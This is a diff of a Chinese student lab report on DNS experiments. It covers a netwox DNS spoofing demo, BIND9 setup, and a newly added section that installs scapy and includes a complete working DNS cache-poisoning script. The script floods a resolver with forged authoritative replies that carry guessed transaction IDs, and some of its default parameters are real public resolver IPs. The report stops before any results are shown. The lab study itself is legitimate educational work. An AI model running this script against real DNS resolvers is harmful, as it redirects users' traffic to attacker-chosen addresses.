@@ -525,9 +525,11 @@ sudo apt install netwox
 >
 > ![image-20261116015900855](./DNS实验.assets/image-20261116015900855.png)
 >
-> 因为当时突然忘记具体DNS了，于是只填了其余项，之前[互联成功](####互联成功)也让我放松了警惕，想着 反正DNS也不会影响联网，无非自动选择DNS……但结果很搞笑
+> 因为~~GPT讲义里面DNS这里留空了所以~~当时突然忘记具体DNS了，于是只填了其余项，之前[互联成功](####互联成功)也让我放松了警惕，想着 反正DNS也不会影响联网，无非自动选择DNS……但结果很搞笑
 >
 > ![image-20261116015247657](./DNS实验.assets/image-20261116015247657.png)
+>
+> 对比一开始就正常配置的 131 和 132 可以发现确实缺了 DNS。
 >
 > 补上 DNS 之后，网络连接和包抓取均正常了。
 >
@@ -535,7 +537,7 @@ sudo apt install netwox
 >
 > **AI 替代大脑开始跟着傻瓜教程一步步流水线式操作迟早出问题**……
 
-#### DNS 欺骗演示
+### DNS 欺骗演示
 
 使用 `netwox 105` 工具构造了 DNS 应答：
 
@@ -592,13 +594,165 @@ sudo netwox 105
 > };
 > ```
 
-因为前面主要测试的是自己的**权威 DNS 区域**，也就是**已知的本地** DNS 及网络信息。
+因为前面主要测试的是自己的**权威 DNS 区域**，也就是**已知的本地** DNS 及网络信息，而后面的缓存投毒实验是希望 130 去**外部查询**一个它没有现成信息的域名，从而出现上游应答。
 
-而后面的缓存投毒实验是希望 130 去**外部查询**一个它没有现成信息的域名，从而出现上游应答。
-
-所以原文临时注释相关区域，再清空缓存并重新启动 BIND9。
+所以需要临时注释相关区域，再清空缓存并重新启动 BIND9。
 
 ![image-20261116025100370](./DNS实验.assets/image-20261116025100370.png)
+
+### 环境配置
+
+默认的 `ubuntu-16.04.6` 自带 python **2.7** （不是 python 3 ），且基本上什么包都没有，甚至连安装包的 **pip 管理都没有**。
+
+```bash
+sudo apt install python-pip
+```
+
+而此处依赖的 `scapy` 库也是没有的。需要安装。然而由于 python 版本老旧，于是需要只能安装到对应支持的版本。
+
+```bash
+pip install --pre scapy[basic] 	# 最新的 Python 2 兼容版本
+pip install scapy==2.5.0		# Scapy 从 2.5.0 版本之后就不再支持 Python 2 了
+```
+
+上面两条里面选择一条即可……吗？
+
+事实上我选用上述
+
+然后运行投毒程序（附件中的）：
+
+```python
+# -*- coding: utf-8 -*-
+"""
+Created on Mon Jul  8 13:42:17 2019
+
+@author: MyPC
+"""
+
+import scapy
+from scapy.all import *
+from scapy.utils import PcapReader
+
+import threading
+import random
+
+import time
+import re
+
+#%%
+ 
+def ipv4_addr_check(ipAddr):
+    p = re.compile('^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(25[0-5]|2[0-4]\d|[01]?\d\d?)$')
+    if p.match(ipAddr):
+        return True
+    else:
+        return False
+
+#输入要请求的域名，返回最终负责的IP地址列表
+def Get_target_IP_list(target_server = "180.76.76.76",domain = "."):
+    ans = sr1(IP(dst=target_server)/UDP(sport=RandShort(), dport=53)/DNS(rd=1,qd=DNSQR(qname=domain,qtype="NS")))
+    #print(ans.show2())
+    IP_list = []
+    for i in range(ans.arcount):
+        #print(ans.ar[i].rdata)
+        if ipv4_addr_check(ans.ar[i].rdata):
+            IP_list.append(ans.ar[i].rdata)
+    #r = ans.ar["DNS Resource Record"]
+    return IP_list
+    
+
+def fake_q(target_recursive_dns_ip,domain):
+    #fake_src=str(random.randint(1,192))+"."+str(random.randint(1,192))+"."+str(random.randint(1,192))+"."+str(random.randint(1,192))
+    #fake_src = "192.168.4.103"
+    req =(IP(dst=target_recursive_dns_ip)/\
+          UDP(sport=random.randint(2000,4000), dport=53)/\
+          DNS(qr=0,ad=1, qd=DNSQR(qname=domain,  qtype="A", qclass=1),))
+        
+    send(req)
+
+
+# 为线程定义一个函数
+def DNS_QR(target_server = "202.117.0.20",qd = "www.baidu.com"):
+    ans = sr1(IP(dst=target_server)/UDP(sport=random.randint(1000,10000), dport=53)/DNS(rd=1,qd=DNSQR(qname=qd,qtype="A")),timeout = 5)
+    try:
+        if ans:
+            if ans.an:
+            #print(ans.show())
+                print(ans.an.rdata)
+                return ans.an.rdata
+        else:
+            return False
+    except:
+        print(ans)
+        os.exit()
+    
+
+def DNS_sending(target_server = "202.117.0.20",domain="www.sahua1.club",iplist=[],times = 500):
+    if len(iplist)==0:
+        print("no ip!!!")
+        return 
+    
+    #伪造回应包
+    ID = []
+    for i in range(times): 
+        #ID.append(random.randint(0,65535))
+        ID.append(i)
+    
+    fake_p = IP(dst=target_server,src=iplist)/\
+      UDP(sport=53, dport=33333)/\
+      DNS(id=ID,qr=1,ra=1,
+          qd=DNSQR(qname=domain,  qtype="A", qclass=1),
+          an=DNSRR(rrname=domain,ttl = 7200,rdata="1.1.1.1")
+          )
+    
+    send(fake_p)
+        
+    
+def start_poison(traget_DNS_server = "202.117.0.20",traget_domain = "www.sahua.club"):
+    up_domain = traget_domain[traget_domain.find('.')+1:]
+    #获取目标域名的上级权威服务器
+    IP_list = Get_target_IP_list(traget_DNS_server,up_domain)
+    print(IP_list)
+    
+    trytime = 0
+    while(True):
+        print(trytime,time.strftime("%Y%m%d %X", time.localtime()))
+        
+        #构造随机域名
+        rand1 = random.randint(1,10000000)
+        rand_domain = str(rand1) +"."+ up_domain
+        print (rand_domain)
+        
+        #向受害DNS服务器发送解析请求
+        t1 = threading.Thread(target=fake_q,args=(traget_DNS_server,rand_domain,), daemon=True)
+        t1.start() # 开始线程
+        t1.join()
+        
+        #开始碰撞
+        DNS_sending(traget_DNS_server,rand_domain,IP_list,50)
+
+        #测试结果是否成功
+        answer = DNS_QR(traget_DNS_server,rand_domain)
+        print (answer)
+        if (answer=="1.1.1.1"):
+            os.exit()
+            print("成功!!!!")
+        else:
+            print("失败!!!!")
+        
+        trytime += 1
+    return 
+
+traget_DNS_server = "10.0.2.4"
+traget_domain = "www.example.com"
+up_domain = traget_domain[traget_domain.find('.')+1:]
+print("up_domain",up_domain)
+
+start_poison(traget_DNS_server,traget_domain)
+
+```
+
+在运行之前
 
 # 由于遇到较大的技术问题以及近日各种考试，后续步骤遇到了一定的时间问题；会在第二天早上之前完成 吗？
 
